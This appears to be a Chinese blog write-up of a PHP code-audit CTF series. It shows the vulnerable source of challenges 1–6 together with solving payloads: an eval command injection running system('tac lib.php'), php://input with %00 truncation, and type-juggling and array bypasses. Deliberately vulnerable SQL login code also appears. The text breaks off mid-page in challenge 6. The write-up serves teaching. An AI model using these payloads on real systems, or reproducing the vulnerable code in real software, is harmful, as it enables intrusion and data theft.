<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#00FFFF">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#00FFFF">





  <meta name="keywords" content="PHP学习," />










<meta name="description" content="PHP_Code_Challenge">
<meta name="keywords" content="PHP学习">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP_Code_Challenge">
<meta property="og:url" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;index.html">
<meta property="og:site_name" content="CyzCc&#39;s blog">
<meta property="og:description" content="PHP_Code_Challenge">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588672298533.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588673393193.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588686122983.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588686655614.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588687567505.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588688594051.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588689264255.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589206914212.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588840767993.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588841559619.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588855862112.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588855895845.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588857266864.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588857952191.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588990386149.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588990523440.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588995335310.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588994986432.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589009096567.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589010937407.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589010955624.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589012783822.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589014602979.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589017428569.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589037176956.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589069580133.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589070166987.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589193100660.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589193740643.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589194023888.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589200437110.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589204540462.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589205337746.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589264462522.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589265667662.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589268617202.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589269001817.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589245105639.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589208538876.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589208146743.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1589205670232.png">
<meta property="og:updated_time" content="2020-05-12T08:09:22.010Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;12&#x2F;PHP_Code_Challenge&#x2F;1588672298533.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://cyzcc.vip/2020/05/12/PHP_Code_Challenge/"/>




<!--留言-->

  <script>
  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
  daovoice('init', {
      app_id: "9e261f4f"
    });
  daovoice('update');
  </script>


  <title>PHP_Code_Challenge | CyzCc's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">CyzCc's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">♫日常学习笔记整理♬♬</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-主页|随笔">
          <a href="/home/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            主页|随笔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-一些知识点">
          <a href="/guestbook/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-comments"></i> <br />
            
            一些知识点
          </a>
        </li>
      
        
        <li class="menu-item menu-item-关于我">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于我
          </a>
        </li>
      
        
        <li class="menu-item menu-item-分类">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-归档">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-links">
          <a href="/links/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
            
            友链
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>


 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://cyzcc.vip/2020/05/12/PHP_Code_Challenge/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="CyzCc">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CyzCc's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">PHP_Code_Challenge</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-12T15:50:54+08:00">
                2020-05-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2020/05/12/PHP_Code_Challenge/" class="leancloud_visitors" data-flag-title="PHP_Code_Challenge">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  8.1k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  38
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="PHP-Code-Challenge"><a href="#PHP-Code-Challenge" class="headerlink" title="PHP_Code_Challenge"></a>PHP_Code_Challenge</h1><a id="more"></a>

<p>PHP_Code_Challenge总结了一些常见的php代码审计的题目，共30关 </p>
<p>题目地址：<br><a href="https://ctf.hutc.xyz" target="_blank" rel="noopener">HUCTF</a><br>148.70.62.239:{port}    Port 23001-23030<br><a href="https://gitee.com/cnwill_sec/PHPCodeChallenge" target="_blank" rel="noopener">https://gitee.com/cnwill_sec/PHPCodeChallenge</a></p>
<h1 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY= </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex($flag)))), <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>使用给出的加密逆向解密上面的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hex2bin		<span class="comment">#把十六进制值转换为 ASCII 字符</span></span><br><span class="line">strrev		<span class="comment">#反转字符串</span></span><br><span class="line">bin2hex		<span class="comment">#把字符串转换为十六进制值</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$str = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($str))));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1588672298533.png" alt="1588672298533"></p>
<h1 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        sleep((int)$_GET[<span class="string">'time'</span>]);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>time必须小于60 * 60 * 24 * 30 * 3，大于60 * 60 * 24 * 30 * 2，is_numeric可以使用科学计数法或者十六进制绕过，即time=0x4f1a00或者time=7e6</p>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588673393193.png" alt="1588673393193"></p>
<h1 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h1><p>查看网页源码发现challenge3.txt，访问得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--challenge3.txt--&gt;"</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    header(<span class="string">'Location: challenge3.php?id=1'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))			<span class="comment">//查看.在$a中第一次出现的位置，这里为不能出现.</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);		<span class="comment">//将$a写入$data</span></span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要满足的条件</p>
<blockquote>
<p>1.$a不能出现<code>.</code>，或者<code>.</code>在第一位，这样条件就为0，不满足<br>2.通过$a写入$data的字符串要为<code>1112 is a nice lab!</code><br>3.id==0<br>4.$b长度大于5，并且111与$b字符串被截取的第一位字符连结后形成的字符串能在1114中匹配到<br>，即连结后的字符串可以是111也可以是1114<br>5.$b第一位不能为4</p>
</blockquote>
<p>解决</p>
<blockquote>
<p>1、2<br>$a=php://input，即<code>file_get_contents(&#39;php://input&#39;,&#39;r&#39;)</code>时<br>$data取请求原始数据流，即post的内容，<code>$a=php://input</code><br>$data取post的数据，post <code>1112 is a nice lab!</code> 即可</p>
<p>3<br>php弱类型比较，数字与字符串等值比较时，字符串取开头的有效数字，无则为0<br>id=a</p>
<p>4、5<br>%00截断对substr有效，对strlen无效（即%00不会对strlen截断）,所以构造</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET:</span> id=a<span class="variable">&amp;a</span>=php:<span class="comment">//input&amp;b=%001111111</span></span><br><span class="line"><span class="symbol">POST:</span><span class="number">1112</span> is a nice lab!</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588686122983.png" alt="1588686122983"></p>
<p>这里使用有些hackbar不能打通，可以更换hackbar或者使用burp</p>
<h1 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($a);"</span>);</span><br></pre></td></tr></table></figure>

<p>简单的命令执行，过滤了cat，使用tac<br>payload</p>
<blockquote>
<p>hello=system(%27tac%20lib.php%27)</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588686655614.png" alt="1588686655614"></p>
<h1 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h1><p>一个登陆框，可以看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>md5弱类型比较，数组绕过即可<br>payload</p>
<blockquote>
<p>name[]=admin&amp;password[]=a</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588687567505.png" alt="1588687567505"></p>
<h1 id="challenge6"><a href="#challenge6" class="headerlink" title="challenge6"></a>challenge6</h1><p>右键源码发现source.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">	$conn = mysql_connect(<span class="string">"********"</span>, <span class="string">"*****"</span>, <span class="string">"********"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"challenges"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line">$sql = <span class="string">"select pwd from interest where uname='$user'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">	printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pwd"];</span></span><br><span class="line">  <span class="keyword">if</span> (($row[pwd]) &amp;&amp; (!strcasecmp($pass, $row[pwd]))) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 